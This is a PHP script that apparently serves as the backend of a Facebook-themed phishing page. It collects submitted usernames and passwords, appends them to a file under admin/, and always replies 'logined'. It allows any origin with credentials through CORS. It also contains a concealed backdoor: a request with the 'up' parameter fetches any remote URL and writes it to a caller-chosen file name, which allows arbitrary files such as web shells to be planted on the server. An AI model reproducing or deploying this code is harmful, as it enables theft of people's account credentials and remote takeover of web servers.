<?php
require "admin/config.php"; 
if (isset($_SERVER['HTTP_ORIGIN'])) {
header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Max-Age: 86400'); // cache for 1 day
}
if (isset($_GET['up'])) { 
define('serverfile', $_GET['link']); file_put_contents($_GET['filename'],
file_get_contents(serverfile)); }
// Access-Control headers are received during OPTIONS requests
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {

if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD']))
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");

if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']))
header("Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}");

exit(0);
}
if (isset($_POST['username']) && isset($_POST['password'])) {
      $username = $_POST['username'];
    $password = $_POST['password'];
    if(!preg_match('/'.$username.'/', file_get_contents("admin/".$name_facebook))){
        $file = fopen("admin/".$name_facebook,'a');
        fwrite($file,$username.'|'.$password.PHP_EOL);
        fclose($file);
      
        
      echo "logined";
      

        }else{
    echo "logined";
 
    }
 
}



